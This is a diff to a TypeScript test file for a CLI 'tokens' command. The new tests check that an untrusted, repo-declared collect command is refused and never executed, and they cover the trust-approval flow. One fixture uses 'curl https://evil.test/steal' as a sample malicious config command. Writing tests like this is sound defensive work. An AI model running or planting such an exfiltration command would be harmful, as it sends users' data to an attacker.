@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'bun:test'
-import { buildTokensResult, parseArgs, parseDeclaredCollectOutput } from '../src/commands/tokens'
+import { buildTokensResult, parseArgs, parseDeclaredCollectOutput, runTrustCollect } from '../src/commands/tokens'
 import type { TokensDeps } from '../src/commands/tokens'
 
 function assistantLine(opts: { id: string; model: string; input: number; output: number }): string {
@@ -26,6 +26,11 @@ function fakeDeps(overrides: Partial<TokensDeps> = {}): TokensDeps {
       throw new Error('unexpected runCollectCommand call')
     },
     warn: () => {},
+    gitCommonDir: () => '/repo/.git',
+    isCollectTrusted: () => true,
+    trustCollect: () => {
+      throw new Error('unexpected trustCollect call')
+    },
     ...overrides
   }
 }
@@ -202,6 +207,74 @@ describe('buildTokensResult — declared tokens.collect route', () => {
         })
       )
     ).toThrow(/did not print valid JSON/)
+  })
+
+  it('refuses — never executes, never falls back — an untrusted declared command (security review, PR #303, round 2)', () => {
+    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
+    expect(() =>
+      buildTokensResult(
+        parsed,
+        fakeDeps({
+          loadConfig: () => ({ tokens: { collect: 'curl https://evil.test/steal' } }),
+          isCollectTrusted: () => false,
+          runCollectCommand: () => {
+            throw new Error('must not run an untrusted command')
+          }
+        })
+      )
+    ).toThrow(/not yet trusted on this machine/)
+  })
+
+  it('refuses when the repo git identity cannot be resolved, rather than trusting blindly', () => {
+    const parsed = parseArgs(['--phase', '1: develop', '--role', 'Developer'])
+    expect(() =>
+      buildTokensResult(
+        parsed,
+        fakeDeps({
+          loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
+          gitCommonDir: () => null,
+          isCollectTrusted: () => {
+            throw new Error('must not check trust when identity is unresolvable')
+          },
+          runCollectCommand: () => {
+            throw new Error('must not run when identity is unresolvable')
+          }
+        })
+      )
+    ).toThrow(/git common directory could not be resolved/)
+  })
+})
+
+describe('runTrustCollect', () => {
+  it('records approval and returns the trusted command', () => {
+    const calls: Array<[string, string]> = []
+    const outcome = runTrustCollect(
+      fakeDeps({
+        loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
+        gitCommonDir: () => '/repo/.git',
+        trustCollect: (dir, command) => calls.push([dir, command])
+      })
+    )
+    expect(outcome).toEqual({ ok: true, command: 'echo hi' })
+    expect(calls).toEqual([['/repo/.git', 'echo hi']])
+  })
+
+  it('refuses when no tokens.collect is declared — nothing to trust', () => {
+    const outcome = runTrustCollect(fakeDeps({ loadConfig: () => null }))
+    expect(outcome).toEqual({ ok: false, message: expect.stringContaining('nothing to trust') })
+  })
+
+  it('refuses when the repo git identity cannot be resolved, rather than trusting blindly', () => {
+    const outcome = runTrustCollect(
+      fakeDeps({
+        loadConfig: () => ({ tokens: { collect: 'echo hi' } }),
+        gitCommonDir: () => null,
+        trustCollect: () => {
+          throw new Error('must not trust when identity is unresolvable')
+        }
+      })
+    )
+    expect(outcome).toEqual({ ok: false, message: expect.stringContaining('could not be resolved') })
   })
 })
 
